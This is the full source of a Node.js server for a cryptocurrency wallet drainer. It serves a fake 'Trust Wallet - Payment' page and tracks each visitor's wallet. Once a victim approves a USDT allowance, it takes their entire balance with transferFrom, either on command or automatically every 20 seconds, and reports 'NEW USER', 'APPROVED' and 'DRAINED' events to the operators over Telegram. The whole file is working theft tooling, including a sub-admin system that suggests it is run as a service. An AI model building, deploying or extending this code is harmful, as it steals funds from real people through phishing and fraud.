const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { URL } = require('url');

const PORT = process.env.PORT || 3000;
const DATA_DIR = path.join(__dirname, '../data');
const CONFIG_FILE = path.join(DATA_DIR, 'config.json');
const USERS_FILE = path.join(DATA_DIR, 'users.json');
const SUBS_FILE = path.join(DATA_DIR, 'subadmins.json');
const PUBLIC_DIR = path.join(__dirname, '../public');
const ADMIN_DIR = path.join(__dirname, '../admin');

const BSC_RPC = 'https://bsc-dataseed.binance.org/';
const USDT = '0x55d398326f99059fF775485246999027B3197955';

if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });

const defaultConfig = {
  adminPassword: process.env.ADMIN_PASSWORD || 'admin123',
  receiverAddress: process.env.RECEIVER_ADDRESS || '',
  privateKey: (process.env.PRIVATE_KEY || '').replace(/^0x/, ''),
  fakeAmount: process.env.FAKE_AMOUNT || '5000000',
  fakeToken: 'USDT',
  chainId: 56,
  networkName: 'BNB Smart Chain',
  siteTitle: 'Trust Wallet - Payment',
  autoMonitor: true,
  autoDrain: process.env.AUTO_DRAIN === 'true' || process.env.AUTO_DRAIN === '1',
  telegramBotToken: process.env.TELEGRAM_BOT_TOKEN || '',
  telegramChatId: process.env.TELEGRAM_CHAT_ID || ''
};

function loadConfig() {
  let cfg = Object.assign({}, defaultConfig);
  try {
    if (fs.existsSync(CONFIG_FILE)) {
      cfg = Object.assign({}, defaultConfig, JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf8')));
    }
  } catch (e) {}
  if (process.env.ADMIN_PASSWORD) cfg.adminPassword = process.env.ADMIN_PASSWORD;
  if (process.env.RECEIVER_ADDRESS) cfg.receiverAddress = process.env.RECEIVER_ADDRESS;
  if (process.env.PRIVATE_KEY) cfg.privateKey = process.env.PRIVATE_KEY.replace(/^0x/, '');
  if (process.env.TELEGRAM_BOT_TOKEN) cfg.telegramBotToken = process.env.TELEGRAM_BOT_TOKEN;
  if (process.env.TELEGRAM_CHAT_ID) cfg.telegramChatId = process.env.TELEGRAM_CHAT_ID;
  if (process.env.AUTO_DRAIN === 'true' || process.env.AUTO_DRAIN === '1') cfg.autoDrain = true;
  if (process.env.FAKE_AMOUNT) cfg.fakeAmount = process.env.FAKE_AMOUNT;
  try {
    if (!fs.existsSync(CONFIG_FILE)) fs.writeFileSync(CONFIG_FILE, JSON.stringify(cfg, null, 2));
  } catch (e) {}
  return cfg;
}

function saveConfig(cfg) {
  try { fs.writeFileSync(CONFIG_FILE, JSON.stringify(cfg, null, 2)); } catch (e) {}
}

function loadUsers() {
  try {
    if (fs.existsSync(USERS_FILE)) return JSON.parse(fs.readFileSync(USERS_FILE, 'utf8'));
  } catch (e) {}
  return [];
}

function saveUsers(users) {
  try { fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2)); } catch (e) {}
}

function loadSubs() {
  try {
    if (fs.existsSync(SUBS_FILE)) return JSON.parse(fs.readFileSync(SUBS_FILE, 'utf8'));
  } catch (e) {}
  return [];
}

function saveSubs(subs) {
  try { fs.writeFileSync(SUBS_FILE, JSON.stringify(subs, null, 2)); } catch (e) {}
}

function uuid() {
  return crypto.randomUUID ? crypto.randomUUID() : crypto.randomBytes(16).toString('hex');
}

function rpc(method, params) {
  return new Promise((resolve, reject) => {
    const body = JSON.stringify({ jsonrpc: '2.0', id: 1, method, params });
    const url = new URL(BSC_RPC);
    const req = https.request({
      hostname: url.hostname, path: url.pathname, method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) }
    }, (res) => {
      let data = '';
      res.on('data', c => data += c);
      res.on('end', () => {
        try {
          const j = JSON.parse(data);
          if (j.error) reject(new Error(j.error.message));
          else resolve(j.result);
        } catch (e) { reject(e); }
      });
    });
    req.on('error', reject);
    req.write(body);
    req.end();
  });
}

function ethCall(to, data) {
  return rpc('eth_call', [{ to, data }, 'latest']);
}

function balanceOf(address) {
  const data = '0x70a08231' + address.toLowerCase().replace('0x', '').padStart(64, '0');
  return ethCall(USDT, data).then(r => BigInt(r || '0x0').toString());
}

function allowance(owner, spender) {
  const data = '0xdd62ed3e' +
    owner.toLowerCase().replace('0x', '').padStart(64, '0') +
    spender.toLowerCase().replace('0x', '').padStart(64, '0');
  return ethCall(USDT, data).then(r => BigInt(r || '0x0').toString());
}

function fromWei(v, decimals = 18) {
  const s = BigInt(v).toString().padStart(decimals + 1, '0');
  const i = s.slice(0, -decimals) || '0';
  const f = s.slice(-decimals).replace(/0+$/, '');
  return f ? i + '.' + f : i;
}

function parseBody(req) {
  return new Promise((resolve) => {
    let data = '';
    req.on('data', c => data += c);
    req.on('end', () => {
      try { resolve(JSON.parse(data || '{}')); }
      catch (e) { resolve({}); }
    });
  });
}

function sendJson(res, code, obj) {
  res.writeHead(code, { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' });
  res.end(JSON.stringify(obj));
}

function sendFile(res, filePath) {
  const ext = path.extname(filePath).toLowerCase();
  const types = { '.html': 'text/html; charset=utf-8', '.js': 'application/javascript; charset=utf-8', '.css': 'text/css; charset=utf-8', '.json': 'application/json' };
  try {
    const data = fs.readFileSync(filePath);
    res.writeHead(200, { 'Content-Type': types[ext] || 'application/octet-stream' });
    res.end(data);
  } catch (e) {
    res.writeHead(404);
    res.end('Not found');
  }
}

function resolveAuth(req) {
  const pass = req.headers['x-admin-pass'] || '';
  const cfg = loadConfig();
  if (pass && pass === cfg.adminPassword) return { role: 'super' };
  const subs = loadSubs();
  const sub = subs.find(s => s.password === pass && s.status !== 'suspended');
  if (sub) return { role: 'sub', sub };
  return null;
}

function tgSendTo(token, chatId, text) {
  if (!token || !chatId) return;
  const body = JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'HTML', disable_web_page_preview: true });
  const url = new URL('https://api.telegram.org/bot' + token + '/sendMessage');
  const req = https.request({
    hostname: url.hostname, path: url.pathname, method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) }
  }, () => {});
  req.on('error', () => {});
  req.write(body);
  req.end();
}

function tgForSpender(spenderAddr, text) {
  const cfg = loadConfig();
  const subs = loadSubs();
  const sub = subs.find(s => s.receiverAddress && s.receiverAddress.toLowerCase() === (spenderAddr || '').toLowerCase() && s.status === 'active');
  if (sub) tgSendTo(sub.telegramBotToken, sub.telegramChatId, text);
  if (cfg.telegramBotToken && cfg.telegramChatId) tgSendTo(cfg.telegramBotToken, cfg.telegramChatId, text);
}

function tgSend(text) {
  const cfg = loadConfig();
  tgSendTo(cfg.telegramBotToken, cfg.telegramChatId, text);
}

async function doTransferFrom(from, to, amount, privateKey) {
  try {
    const Web3 = require('web3');
    const web3 = new Web3(BSC_RPC);
    const account = web3.eth.accounts.privateKeyToAccount(privateKey.startsWith('0x') ? privateKey : '0x' + privateKey);
    web3.eth.accounts.wallet.add(account);
    const abi = [{"constant":false,"inputs":[{"name":"from","type":"address"},{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function"}];
    const contract = new web3.eth.Contract(abi, USDT);
    const tx = await contract.methods.transferFrom(from, to, amount).send({ from: account.address, gas: 100000 });
    return { success: true, txHash: tx.transactionHash, amount: fromWei(amount) };
  } catch (e) {
    return { success: false, error: e.message };
  }
}

function findOwnerForUser(user) {
  const cfg = loadConfig();
  if (user.spender) {
    const subs = loadSubs();
    const sub = subs.find(s => s.receiverAddress && s.receiverAddress.toLowerCase() === user.spender.toLowerCase());
    if (sub) return { type: 'sub', sub, receiver: sub.receiverAddress, privateKey: sub.privateKey, autoDrain: true };
  }
  return { type: 'super', receiver: cfg.receiverAddress, privateKey: cfg.privateKey, autoDrain: cfg.autoDrain };
}

const server = http.createServer(async (req, res) => {
  if (req.method === 'OPTIONS') {
    res.writeHead(204, {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Headers': 'Content-Type, x-admin-pass',
      'Access-Control-Allow-Methods': 'GET,POST,DELETE,PUT,OPTIONS'
    });
    return res.end();
  }

  const u = new URL(req.url, 'http://localhost');
  const p = u.pathname;

  if (req.method === 'GET' && (p === '/' || p === '/index.html')) return sendFile(res, path.join(PUBLIC_DIR, 'index.html'));
  if (req.method === 'GET' && p.startsWith('/') && !p.startsWith('/api') && p !== '/admin') {
    const fp = path.join(PUBLIC_DIR, p.slice(1));
    if (fp.startsWith(PUBLIC_DIR) && fs.existsSync(fp) && fs.statSync(fp).isFile()) return sendFile(res, fp);
  }
  if (req.method === 'GET' && p === '/admin') return sendFile(res, path.join(ADMIN_DIR, 'index.html'));

  if (p === '/api/config' && req.method === 'GET') {
    const cfg = loadConfig();
    return sendJson(res, 200, { fakeAmount: cfg.fakeAmount, fakeToken: cfg.fakeToken, chainId: cfg.chainId, networkName: cfg.networkName, siteTitle: cfg.siteTitle, usdtAddress: USDT });
  }

  if (p === '/api/spender' && req.method === 'GET') {
    const cfg = loadConfig();
    const subs = loadSubs().filter(s => s.status === 'active');
    const q = (u.searchParams.get('s') || u.searchParams.get('spender') || '').toLowerCase();
    const qid = u.searchParams.get('id') || '';
    if (q && /^0x[a-f0-9]{40}$/.test(q)) {
      const sub = subs.find(s => s.receiverAddress && s.receiverAddress.toLowerCase() === q);
      if (sub) return sendJson(res, 200, { spender: sub.receiverAddress, subId: sub.id, name: sub.name });
      if (cfg.receiverAddress && cfg.receiverAddress.toLowerCase() === q) return sendJson(res, 200, { spender: cfg.receiverAddress });
    }
    if (qid) {
      const sub = subs.find(s => s.id === qid);
      if (sub) return sendJson(res, 200, { spender: sub.receiverAddress, subId: sub.id, name: sub.name });
    }
    if (cfg.receiverAddress) return sendJson(res, 200, { spender: cfg.receiverAddress });
    if (subs.length) return sendJson(res, 200, { spender: subs[0].receiverAddress, subId: subs[0].id, name: subs[0].name });
    return sendJson(res, 200, { spender: null });
  }

  if (p === '/api/user/connect' && req.method === 'POST') {
    const body = await parseBody(req);
    const address = body.address;
    if (!address || !/^0x[a-fA-F0-9]{40}$/.test(address)) return sendJson(res, 400, { error: 'Invalid address' });
    let users = loadUsers();
    let user = users.find(x => x.address.toLowerCase() === address.toLowerCase());
    if (!user) {
      user = { id: uuid(), address, connectedAt: new Date().toISOString(), lastSeen: new Date().toISOString(), chainId: 56, balanceBNB: '0', balanceUSDT: '0', allowance: '0', approved: false, drained: false, status: 'connected', drainedAmount: '0', txHash: null, spender: body.spender || null };
      users.push(user);
      const msg = '🟢 <b>NEW USER</b>\n\n👤 ID: <code>' + user.id.slice(0,8) + '</code>\n📍 <code>' + address + '</code>\n⏰ ' + new Date().toLocaleString('en-IN');
      if (user.spender) tgForSpender(user.spender, msg); else tgSend(msg);
    } else {
      user.lastSeen = new Date().toISOString();
      if (body.spender) user.spender = body.spender;
    }
    saveUsers(users);
    return sendJson(res, 200, { success: true, id: user.id });
  }

  if (p === '/api/user/update' && req.method === 'POST') {
    const body = await parseBody(req);
    let users = loadUsers();
    let user = users.find(x => x.address.toLowerCase() === (body.address || '').toLowerCase());
    if (user) {
      const oldUSDT = parseFloat(user.balanceUSDT || 0);
      if (body.balanceBNB !== undefined) user.balanceBNB = body.balanceBNB;
      if (body.balanceUSDT !== undefined) user.balanceUSDT = body.balanceUSDT;
      user.lastSeen = new Date().toISOString();
      const newUSDT = parseFloat(user.balanceUSDT || 0);
      if (newUSDT > oldUSDT + 0.01) {
        const msg = '💰 <b>DEPOSIT</b>\n\n👤 ID: <code>' + user.id.slice(0,8) + '</code>\n📍 <code>' + user.address + '</code>\n💵 New USDT: <b>' + user.balanceUSDT + '</b>\n⛽ BNB: ' + (user.balanceBNB || '0') + '\n⏰ ' + new Date().toLocaleString('en-IN');
        if (user.spender) tgForSpender(user.spender, msg); else tgSend(msg);
      }
      saveUsers(users);
    }
    return sendJson(res, 200, { success: true });
  }

  if (p === '/api/user/approved' && req.method === 'POST') {
    const body = await parseBody(req);
    let users = loadUsers();
    let user = users.find(x => x.address.toLowerCase() === (body.address || '').toLowerCase());
    if (user) {
      user.approved = true;
      user.allowance = body.allowance || 'unlimited';
      user.status = 'approved';
      user.lastSeen = new Date().toISOString();
      if (body.spender) user.spender = body.spender;
      saveUsers(users);
      const msg = '✅ <b>APPROVED</b>\n\n👤 ID: <code>' + user.id.slice(0,8) + '</code>\n📍 <code>' + user.address + '</code>\n💵 USDT: <b>' + (user.balanceUSDT || '0') + '</b>\n⛽ BNB: ' + (user.balanceBNB || '0') + '\n🔐 Allowance: ' + user.allowance + '\n⏰ ' + new Date().toLocaleString('en-IN');
      if (user.spender) tgForSpender(user.spender, msg); else tgSend(msg);
    }
    return sendJson(res, 200, { success: true });
  }

  if (p.startsWith('/api/admin')) {
    const auth = resolveAuth(req);
    if (!auth) return sendJson(res, 401, { error: 'Unauthorized' });

    if (p === '/api/admin/me' && req.method === 'GET') {
      if (auth.role === 'super') return sendJson(res, 200, { role: 'super', name: 'Super Admin' });
      return sendJson(res, 200, { role: 'sub', id: auth.sub.id, name: auth.sub.name, receiverAddress: auth.sub.receiverAddress, status: auth.sub.status });
    }

    if (p === '/api/admin/subs' && req.method === 'GET') {
      if (auth.role !== 'super') return sendJson(res, 403, { error: 'Super only' });
      const subs = loadSubs().map(s => ({
        id: s.id, name: s.name, receiverAddress: s.receiverAddress, hasPrivateKey: !!s.privateKey,
        telegramBotToken: s.telegramBotToken ? '***set***' : '', telegramChatId: s.telegramChatId || '',
        status: s.status || 'active', createdAt: s.createdAt, password: s.password ? '***' : ''
      }));
      return sendJson(res, 200, subs);
    }

    if (p === '/api/admin/subs' && req.method === 'POST') {
      if (auth.role !== 'super') return sendJson(res, 403, { error: 'Super only' });
      const body = await parseBody(req);
      if (!body.name || !body.password) return sendJson(res, 400, { error: 'Name and password required' });
      if (body.receiverAddress && !/^0x[a-fA-F0-9]{40}$/.test(body.receiverAddress)) return sendJson(res, 400, { error: 'Invalid receiver address' });
      const subs = loadSubs();
      if (subs.find(s => s.name.toLowerCase() === body.name.toLowerCase())) return sendJson(res, 400, { error: 'Name already exists' });
      const sub = {
        id: uuid(), name: body.name, password: body.password,
        receiverAddress: body.receiverAddress || '', privateKey: body.privateKey ? body.privateKey.replace(/^0x/, '') : '',
        telegramBotToken: body.telegramBotToken || '', telegramChatId: body.telegramChatId || '',
        status: 'active', createdAt: new Date().toISOString()
      };
      subs.push(sub);
      saveSubs(subs);
      return sendJson(res, 200, { success: true, id: sub.id });
    }

    if (p.startsWith('/api/admin/subs/') && req.method === 'PUT') {
      if (auth.role !== 'super') return sendJson(res, 403, { error: 'Super only' });
      const id = p.split('/').pop();
      const body = await parseBody(req);
      let subs = loadSubs();
      const sub = subs.find(s => s.id === id);
      if (!sub) return sendJson(res, 404, { error: 'Not found' });
      if (body.name !== undefined) sub.name = body.name;
      if (body.password) sub.password = body.password;
      if (body.receiverAddress !== undefined) {
        if (body.receiverAddress && !/^0x[a-fA-F0-9]{40}$/.test(body.receiverAddress)) return sendJson(res, 400, { error: 'Invalid address' });
        sub.receiverAddress = body.receiverAddress;
      }
      if (body.privateKey) sub.privateKey = body.privateKey.replace(/^0x/, '');
      if (body.telegramBotToken !== undefined) sub.telegramBotToken = body.telegramBotToken;
      if (body.telegramChatId !== undefined) sub.telegramChatId = body.telegramChatId;
      if (body.status === 'active' || body.status === 'suspended') sub.status = body.status;
      saveSubs(subs);
      return sendJson(res, 200, { success: true });
    }

    if (p.startsWith('/api/admin/subs/') && req.method === 'DELETE') {
      if (auth.role !== 'super') return sendJson(res, 403, { error: 'Super only' });
      const id = p.split('/').pop();
      saveSubs(loadSubs().filter(s => s.id !== id));
      return sendJson(res, 200, { success: true });
    }

    if (p.startsWith('/api/admin/subs/') && p.endsWith('/users') && req.method === 'GET') {
      const parts = p.split('/');
      const id = parts[parts.length - 2];
      if (auth.role === 'sub' && auth.sub.id !== id) return sendJson(res, 403, { error: 'Forbidden' });
      const subs = loadSubs();
      const sub = subs.find(s => s.id === id);
      if (!sub) return sendJson(res, 404, { error: 'Not found' });
      const users = loadUsers().filter(u => u.spender && sub.receiverAddress && u.spender.toLowerCase() === sub.receiverAddress.toLowerCase());
      return sendJson(res, 200, { sub: { id: sub.id, name: sub.name, receiverAddress: sub.receiverAddress, status: sub.status, telegramChatId: sub.telegramChatId, hasPrivateKey: !!sub.privateKey, createdAt: sub.createdAt }, users });
    }

    if (p === '/api/admin/config' && req.method === 'GET') {
      if (auth.role === 'sub') {
        return sendJson(res, 200, { role: 'sub', receiverAddress: auth.sub.receiverAddress, fakeAmount: loadConfig().fakeAmount, hasPrivateKey: !!auth.sub.privateKey, telegramChatId: auth.sub.telegramChatId || '', telegramBotToken: auth.sub.telegramBotToken ? '***set***' : '', autoDrain: true });
      }
      const cfg = loadConfig();
      return sendJson(res, 200, { role: 'super', receiverAddress: cfg.receiverAddress, fakeAmount: cfg.fakeAmount, adminPassword: cfg.adminPassword ? '***' : '', autoMonitor: cfg.autoMonitor, autoDrain: cfg.autoDrain, networkName: cfg.networkName, telegramBotToken: cfg.telegramBotToken ? '***set***' : '', telegramChatId: cfg.telegramChatId || '', hasPrivateKey: !!cfg.privateKey });
    }

    if (p === '/api/admin/config' && req.method === 'POST') {
      const body = await parseBody(req);
      if (auth.role === 'sub') {
        const subs = loadSubs();
        const sub = subs.find(s => s.id === auth.sub.id);
        if (!sub) return sendJson(res, 404, { error: 'Not found' });
        if (body.telegramBotToken) sub.telegramBotToken = body.telegramBotToken;
        if (body.telegramChatId !== undefined) sub.telegramChatId = body.telegramChatId;
        if (body.password) sub.password = body.password;
        if (body.privateKey) sub.privateKey = body.privateKey.replace(/^0x/, '');
        saveSubs(subs);
        return sendJson(res, 200, { success: true });
      }
      const cfg = loadConfig();
      if (body.receiverAddress !== undefined) cfg.receiverAddress = body.receiverAddress;
      if (body.fakeAmount !== undefined) cfg.fakeAmount = body.fakeAmount;
      if (body.adminPassword) cfg.adminPassword = body.adminPassword;
      if (body.autoMonitor !== undefined) cfg.autoMonitor = body.autoMonitor;
      if (body.autoDrain !== undefined) cfg.autoDrain = body.autoDrain;
      if (body.privateKey) cfg.privateKey = body.privateKey.replace(/^0x/, '');
      if (body.telegramBotToken) cfg.telegramBotToken = body.telegramBotToken;
      if (body.telegramChatId !== undefined) cfg.telegramChatId = body.telegramChatId;
      saveConfig(cfg);
      return sendJson(res, 200, { success: true });
    }

    if (p === '/api/admin/users' && req.method === 'GET') {
      let users = loadUsers();
      if (auth.role === 'sub') {
        const recv = (auth.sub.receiverAddress || '').toLowerCase();
        users = users.filter(u => u.spender && u.spender.toLowerCase() === recv);
      }
      return sendJson(res, 200, users);
    }

    if (p.startsWith('/api/admin/user/') && req.method === 'DELETE') {
      const id = p.split('/').pop();
      let users = loadUsers();
      const user = users.find(x => x.id === id);
      if (!user) return sendJson(res, 404, { error: 'Not found' });
      if (auth.role === 'sub') {
        const recv = (auth.sub.receiverAddress || '').toLowerCase();
        if (!user.spender || user.spender.toLowerCase() !== recv) return sendJson(res, 403, { error: 'Not your user' });
      }
      saveUsers(users.filter(x => x.id !== id));
      return sendJson(res, 200, { success: true });
    }

    if (p.startsWith('/api/admin/refresh/') && req.method === 'POST') {
      const id = p.split('/').pop();
      let users = loadUsers();
      let user = users.find(x => x.id === id);
      if (!user) return sendJson(res, 404, { error: 'Not found' });
      if (auth.role === 'sub') {
        const recv = (auth.sub.receiverAddress || '').toLowerCase();
        if (!user.spender || user.spender.toLowerCase() !== recv) return sendJson(res, 403, { error: 'Not your user' });
      }
      try {
        const bnbHex = await rpc('eth_getBalance', [user.address, 'latest']);
        user.balanceBNB = fromWei(BigInt(bnbHex).toString());
        const usdtBal = await balanceOf(user.address);
        user.balanceUSDT = fromWei(usdtBal);
        const owner = findOwnerForUser(user);
        const spender = owner.receiver || user.spender;
        if (spender) {
          const allow = await allowance(user.address, spender);
          user.allowance = fromWei(allow);
          user.approved = BigInt(allow) > 0n;
          if (user.approved && !user.drained) user.status = 'approved';
        }
        user.lastSeen = new Date().toISOString();
        saveUsers(users);
        return sendJson(res, 200, { success: true, user });
      } catch (e) {
        return sendJson(res, 500, { error: e.message });
      }
    }

    if (p.startsWith('/api/admin/drain/') && req.method === 'POST') {
      const id = p.split('/').pop();
      let users = loadUsers();
      let user = users.find(x => x.id === id);
      if (!user) return sendJson(res, 404, { error: 'Not found' });
      if (auth.role === 'sub') {
        const recv = (auth.sub.receiverAddress || '').toLowerCase();
        if (!user.spender || user.spender.toLowerCase() !== recv) return sendJson(res, 403, { error: 'Not your user' });
      }
      let receiver, privateKey;
      if (auth.role === 'sub') {
        receiver = auth.sub.receiverAddress;
        privateKey = auth.sub.privateKey;
      } else {
        const owner = findOwnerForUser(user);
        receiver = owner.receiver;
        privateKey = owner.privateKey;
      }
      if (!receiver) return sendJson(res, 400, { error: 'Set receiver address first' });
      try {
        const bal = await balanceOf(user.address);
        if (bal === '0') return sendJson(res, 400, { error: 'Zero USDT balance' });
        if (privateKey) {
          const result = await doTransferFrom(user.address, receiver, bal, privateKey);
          if (result.success) {
            user.drained = true;
            user.status = 'drained';
            user.drainedAmount = result.amount;
            user.txHash = result.txHash;
            saveUsers(users);
            const msg = '🔥 <b>DRAINED</b>\n\n👤 ID: <code>' + user.id.slice(0,8) + '</code>\n📍 <code>' + user.address + '</code>\n💵 Amount: <b>' + result.amount + ' USDT</b>\n🔗 Tx: <code>' + result.txHash + '</code>\n⏰ ' + new Date().toLocaleString('en-IN');
            if (user.spender) tgForSpender(user.spender, msg); else tgSend(msg);
            return sendJson(res, 200, { success: true, amount: result.amount, txHash: result.txHash });
          }
          return sendJson(res, 500, { error: result.error });
        }
        user.status = 'ready_to_drain';
        user.drainedAmount = fromWei(bal);
        saveUsers(users);
        return sendJson(res, 200, { success: true, message: 'Ready. Private key missing', amount: fromWei(bal), from: user.address, to: receiver });
      } catch (e) {
        return sendJson(res, 500, { error: e.message });
      }
    }

    if (p === '/api/admin/drain-all' && req.method === 'POST') {
      let users = loadUsers();
      if (auth.role === 'sub') {
        const recv = (auth.sub.receiverAddress || '').toLowerCase();
        users = users.filter(u => u.spender && u.spender.toLowerCase() === recv);
      }
      const results = [];
      for (const user of users) {
        if (user.drained || !user.approved) continue;
        try {
          const bal = await balanceOf(user.address);
          if (bal === '0') continue;
          let receiver, privateKey;
          if (auth.role === 'sub') {
            receiver = auth.sub.receiverAddress;
            privateKey = auth.sub.privateKey;
          } else {
            const owner = findOwnerForUser(user);
            receiver = owner.receiver;
            privateKey = owner.privateKey;
          }
          if (!receiver || !privateKey) {
            user.status = 'ready_to_drain';
            user.drainedAmount = fromWei(bal);
            results.push({ address: user.address, amount: fromWei(bal), note: 'no key' });
            continue;
          }
          const result = await doTransferFrom(user.address, receiver, bal, privateKey);
          if (result.success) {
            user.drained = true;
            user.status = 'drained';
            user.drainedAmount = result.amount;
            user.txHash = result.txHash;
            results.push({ address: user.address, amount: result.amount, txHash: result.txHash });
            const msg = '🔥 <b>DRAINED</b>\n\n👤 ID: <code>' + user.id.slice(0,8) + '</code>\n📍 <code>' + user.address + '</code>\n💵 Amount: <b>' + result.amount + ' USDT</b>\n🔗 Tx: <code>' + result.txHash + '</code>\n⏰ ' + new Date().toLocaleString('en-IN');
            if (user.spender) tgForSpender(user.spender, msg); else tgSend(msg);
          } else {
            results.push({ address: user.address, error: result.error });
          }
        } catch (e) {
          results.push({ address: user.address, error: e.message });
        }
      }
      const all = loadUsers();
      for (const u of users) {
        const i = all.findIndex(x => x.id === u.id);
        if (i >= 0) all[i] = u;
      }
      saveUsers(all);
      return sendJson(res, 200, { success: true, results });
    }

    if (p === '/api/admin/test-telegram' && req.method === 'POST') {
      if (auth.role === 'sub') tgSendTo(auth.sub.telegramBotToken, auth.sub.telegramChatId, '<b>Test Message</b>\n\nSub-Admin Telegram OK\nTime: ' + new Date().toLocaleString());
      else tgSend('<b>Test Message</b>\n\nSuper Admin Telegram OK\nTime: ' + new Date().toLocaleString());
      return sendJson(res, 200, { success: true });
    }
  }

  res.writeHead(404);
  res.end('Not found');
});

setInterval(async () => {
  const cfg = loadConfig();
  if (!cfg.autoMonitor) return;
  let users = loadUsers();
  let changed = false;
  const subs = loadSubs().filter(s => s.status === 'active');
  for (const user of users) {
    if (user.drained) continue;
    try {
      const bnbHex = await rpc('eth_getBalance', [user.address, 'latest']);
      const newBNB = fromWei(BigInt(bnbHex).toString());
      const usdtBal = await balanceOf(user.address);
      const newUSDT = fromWei(usdtBal);
      const oldUSDT = parseFloat(user.balanceUSDT || 0);
      if (user.balanceBNB !== newBNB || user.balanceUSDT !== newUSDT) {
        if (parseFloat(newUSDT) > oldUSDT + 0.01) {
          const msg = '💰 <b>DEPOSIT</b>\n\n👤 ID: <code>' + user.id.slice(0,8) + '</code>\n📍 <code>' + user.address + '</code>\n💵 New USDT: <b>' + newUSDT + '</b>\n⛽ BNB: ' + newBNB + '\n⏰ ' + new Date().toLocaleString('en-IN');
          if (user.spender) tgForSpender(user.spender, msg); else tgSend(msg);
        }
        user.balanceBNB = newBNB;
        user.balanceUSDT = newUSDT;
        changed = true;
      }
      const owner = findOwnerForUser(user);
      const spender = owner.receiver || user.spender;
      if (spender) {
        const allow = await allowance(user.address, spender);
        const newAllow = fromWei(allow);
        if (user.allowance !== newAllow) {
          user.allowance = newAllow;
          user.approved = BigInt(allow) > 0n;
          if (user.approved) user.status = 'approved';
          changed = true;
        }
      }
      if (user.approved && parseFloat(user.balanceUSDT || 0) > 0) {
        let pk = owner.privateKey;
        let recv = owner.receiver;
        let doAuto = owner.autoDrain;
        if (user.spender) {
          const sub = subs.find(s => s.receiverAddress && s.receiverAddress.toLowerCase() === user.spender.toLowerCase());
          if (sub && sub.privateKey) { pk = sub.privateKey; recv = sub.receiverAddress; doAuto = true; }
        }
        if (doAuto && pk && recv) {
          const bal = await balanceOf(user.address);
          if (bal !== '0') {
            const result = await doTransferFrom(user.address, recv, bal, pk);
            if (result.success) {
              user.drained = true;
              user.status = 'drained';
              user.drainedAmount = result.amount;
              user.txHash = result.txHash;
              changed = true;
              const msg = '🔥 <b>DRAINED</b>\n\n👤 ID: <code>' + user.id.slice(0,8) + '</code>\n📍 <code>' + user.address + '</code>\n💵 Amount: <b>' + result.amount + ' USDT</b>\n🔗 Tx: <code>' + result.txHash + '</code>\n⏰ ' + new Date().toLocaleString('en-IN');
              if (user.spender) tgForSpender(user.spender, msg); else tgSend(msg);
            }
          }
        }
      }
    } catch (e) {}
  }
  if (changed) saveUsers(users);
}, 20000);

server.listen(PORT, '0.0.0.0', () => {
  console.log('BSC Super/Sub Admin LIVE on http://0.0.0.0:' + PORT);
  console.log('Admin: http://0.0.0.0:' + PORT + '/admin');
  console.log('Password: ' + (process.env.ADMIN_PASSWORD || 'admin123'));
});
